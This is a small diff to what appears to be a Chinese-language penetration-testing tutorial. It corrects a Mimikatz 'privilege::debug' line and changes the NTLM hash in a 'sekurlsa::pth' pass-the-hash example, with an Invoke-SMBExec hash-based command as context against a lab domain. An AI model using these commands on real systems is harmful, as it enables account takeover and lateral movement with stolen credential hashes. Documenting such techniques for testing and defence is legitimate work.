@@ -141,8 +141,8 @@ Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash 7ECF
 参数实例：
 
 ```
-privilege：：debug
-sekurlsa::pth /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1
+privilege::debug
+sekurlsa::pth /user:test1 /domain:test.local /ntlm:c5a237b7e9d8e708d8436b6148a25fa1
 ```
 
 **注：**
